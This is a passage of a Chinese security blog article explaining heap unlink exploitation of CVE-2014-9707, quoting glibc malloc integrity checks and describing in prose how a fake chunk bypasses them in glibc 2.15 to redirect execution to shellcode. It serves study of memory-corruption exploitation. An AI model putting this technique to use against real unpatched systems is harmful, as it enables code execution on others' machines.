&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BK-&gt;fd&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!in_smallbin_range&nbsp;(P-&gt;size)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp;&nbsp;__builtin_expect&nbsp;(P-&gt;fd_nextsize&nbsp;!=&nbsp;NULL,&nbsp;0))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(__builtin_expect&nbsp;(P-&gt;fd_nextsize-&gt;bk_nextsize&nbsp;!=&nbsp;P,&nbsp;0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;__builtin_expect&nbsp;(P-&gt;bk_nextsize-&gt;fd_nextsize&nbsp;!=&nbsp;P,&nbsp;0))&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;malloc_printerr&nbsp;(check_action,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;corrupted&nbsp;double-linked&nbsp;list&nbsp;(not&nbsp;small)&quot;,&nbsp;P);\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(FD-&gt;fd_nextsize&nbsp;==&nbsp;NULL)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(P-&gt;fd_nextsize&nbsp;==&nbsp;P)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;fd_nextsize&nbsp;=&nbsp;FD-&gt;bk_nextsize&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;fd_nextsize&nbsp;=&nbsp;P-&gt;fd_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;bk_nextsize&nbsp;=&nbsp;P-&gt;bk_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;fd_nextsize-&gt;bk_nextsize&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;bk_nextsize-&gt;fd_nextsize&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;fd_nextsize-&gt;bk_nextsize&nbsp;=&nbsp;P-&gt;bk_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;bk_nextsize-&gt;fd_nextsize&nbsp;=&nbsp;P-&gt;fd_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">和上面的代码大同小异，但是可以看到在之前的assert断言中判断的内容，被挪到if语句中进行判断，也就是说利用fd_nextsize和bk_nextsize伪造的方法不能再利用了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因此在最新版glibc下如何完成堆溢出，是我下一步想研究的内容。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从unlink到漏洞利用</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">讲了glibc版本更迭，攻防对抗的升级，下面来讲一下这个漏洞的利用，在之前的内容中我们提到path是可控的，也就是说我们利用path覆盖top chunk，然后在segment被释放的时候，会去top chunk header中判断path块是否空闲，如果这时候欺骗linux让它认为path块空闲，则会触发path块unlink操作，从而导致漏洞呗利用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在最老的版本glibc中，我们只需要将fd和bk分别设置为特定值即可完成利用，但是之前也提到新版glibc中发生的变化，下面我们来看一下linux中对抗堆溢出需要注意哪些情况吧。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先linux会对堆大小进行检查，也就是说chunk header中的prev_size会被检查，这是为了对抗堆溢出中，设定prev_size为－4这种负数的情况，用于欺骗，因为为了计算前一个堆的偏移会用某chunk头部地址减去prev_size。</span></p><p style="text-align:center"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p0.qhimg.com/t01b2dded4b4ba645ce.png" title="t019e9f0b5f646d7a84.png" alt="http://p8.qhimg.com/t019e9f0b5f646d7a84.png" style="text-align: center; white-space: normal;"/></span></p><p style="text-align:center"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这时候就会产生错误。</span></p><p style="text-align:center"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p3.qhimg.com/t018cf2cda020d4a4cc.png" title="t012693281a65d301ca.png" alt="http://p1.qhimg.com/t012693281a65d301ca.png" style="text-align: center; white-space: normal;"/></span></p><p style="text-align:center"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">来看一下glibc2.15的malloc.c中关于前一块大小检查部分的代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
&nbsp;&nbsp;&nbsp;&nbsp;nextsize&nbsp;=&nbsp;chunksize(nextchunk);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(__builtin_expect&nbsp;(nextchunk-&gt;size&nbsp;&lt;=&nbsp;2&nbsp;*&nbsp;SIZE_SZ,&nbsp;0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;__builtin_expect&nbsp;(nextsize&nbsp;&gt;=&nbsp;av-&gt;system_mem,&nbsp;0))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errstr&nbsp;=&nbsp;&quot;free():&nbsp;invalid&nbsp;next&nbsp;size&nbsp;(normal)&quot;;
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，在这里会对nextsize进行判断，nextsize是由下一块的chunksize得到，这时我们要记住prev_size，纪录的是前一块的大小，04030201时产生错误。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其次是double free的检查，不能连续释放两次，也就是说，当堆溢出覆盖下一个块和下下一个块的in_use位为0的时候（空闲状态），会无法通过double free的检查。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t010177a0df92441c0f.png" title="t01107085aa661098e2.png" alt="http://p6.qhimg.com/t01107085aa661098e2.png" style="text-align: center; white-space: normal;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，这时大小变成01020304后，通过了next size的检查，但是来看IN_USE位，当下一块和下下块IN_USE位都为0时，也就是连续两个块都空闲，则无法通过double free的检查。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01d6bb6e6379282ecf.png" title="t01b6a2a888b851db07.png" alt="http://p5.qhimg.com/t01b6a2a888b851db07.png" style="text-align: center; white-space: normal;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">来看一下malloc.c中的相关代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Or&nbsp;whether&nbsp;the&nbsp;block&nbsp;is&nbsp;actually&nbsp;not&nbsp;marked&nbsp;used.&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(__builtin_expect&nbsp;(!prev_inuse(nextchunk),&nbsp;0))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errstr&nbsp;=&nbsp;&quot;double&nbsp;free&nbsp;or&nbsp;corruption&nbsp;(!prev)&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;errout;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">因此不能有连续两个块IN_USE都为0.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">于是，我们可以构造这样的利用方法，glibc 2.15版本下，最新版会有新的防护，之前已经提到。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01d799e87ba51d1f71.png" title="t01b08d18e48027064f.png" alt="http://p4.qhimg.com/t01b08d18e48027064f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里，我们构造一个伪造的块处于path块和top chunk块之间，用这种方法来绕过之前提到的FD-&gt;bk=P的检查，最后在前面的章节中，我们介绍到利用fd_nextsize和bk_nextsize的方法来完成最终的代码执行，于是我们将返回地址和shellcode地址分别布置在这两处位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后我们可以完成利用。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t017c48e011a3f37dbf.png" title="t01152a385d493ab9e4.png" alt="http://p7.qhimg.com/t01152a385d493ab9e4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这个研究中，我对linux堆溢出有了更深刻的理解，确实刚开始接触堆溢出的时候感觉很乱，尤其是链表，后来发现自己研究链表的机制，很快就能明白，尤其是配合这个漏洞进行调试，希望大家能够多多交流，共同进步！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">参考链接</span></strong></span></p><hr/><p style="text-indent: 2em;"><a href="http://seclists.org/fulldisclosure/2015/Mar/157" _src="http://seclists.org/fulldisclosure/2015/Mar/157" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">http://seclists.org/fulldisclosure/2015/Mar/157</span></a></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><a href="http://bbs.pediy.com/showthread.php?t=211365" _src="http://bbs.pediy.com/showthread.php?t=211365" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;">http://bbs.pediy.com/showthread.php?t=211365</a></span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3043.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】从CVE-2014-9707看unlink漏洞利用 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3043" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="4263" user-name="random" href="javascript:;">
                random            </a>
                        <span class="comment-time">2016-09-20 20:14:14</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4263">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4263" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">不懂的人还是不懂,懂的人自然懂。
如果再能详细点就更好了。感谢师傅分享</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t00df551a583a87f4e9.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="561536297" class="response" data-bind-id="561536297" data-target="4259" user-name="360U561536297" href="javascript:;">
                360U561536297            </a>
                        <span class="comment-time">2016-09-20 17:35:14</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="561536297" data-target="4259">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4259" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">猜猜我是谁，我也来跪舔一下k0师傅</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/1x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="4258" user-name="情痴菜鸟" href="javascript:;">
                情痴菜鸟            </a>
                        <span class="comment-time">2016-09-20 17:29:44</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4258">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4258" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">目测楼下是刀师傅。。。。。前来跪舔一下k0师傅</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
